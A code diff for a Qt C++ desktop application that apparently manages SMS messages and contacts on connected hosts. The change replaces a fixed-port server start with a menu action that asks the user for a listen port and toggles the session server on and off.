@@ -8,6 +8,7 @@
 #include <QDir>
 #include <QTextStream>
 #include <QMessageBox>
+#include <QInputDialog>
 #include "sendsmsdialog.h"
 
 MainWindow::MainWindow(QWidget *parent) :
@@ -18,7 +19,6 @@ MainWindow::MainWindow(QWidget *parent) :
     init();
     initView();
     updateView();
-    mSessionManager.start(8000);
 }
 
 MainWindow::~MainWindow()
@@ -61,11 +61,35 @@ void MainWindow::initView()
     QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
     QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
     QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
+
+    ui->actionStartServer->setText("Start Server");
+    QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
 }
 
 void MainWindow::updateView()
 {
     ui->hostCountLabel->setText(QString("Host: %1, Selected: %2").arg(mModel.rowCount()).arg(mModel.getSelectedCount()));
+}
+
+void MainWindow::handleServerStart()
+{
+    if(mSessionManager.isStart())
+    {
+        mSessionManager.stop();
+        mModel.cleanAll();
+        ui->actionStartServer->setText("Start Server");
+    }
+    else
+    {
+        bool ok = false;
+        int port = QInputDialog::getInt(this, "Listen Port", "Input port:", 8000,  1, 65535, 1, &ok);
+        if(ok)
+        {
+            ui->actionStartServer->setText(QString("Stop Server (Listen on %1)").arg(port));
+            mSessionManager.start(port);
+        }
+
+    }
 }
 
 void MainWindow::handleNewSession(NetworkSession* networkSession)
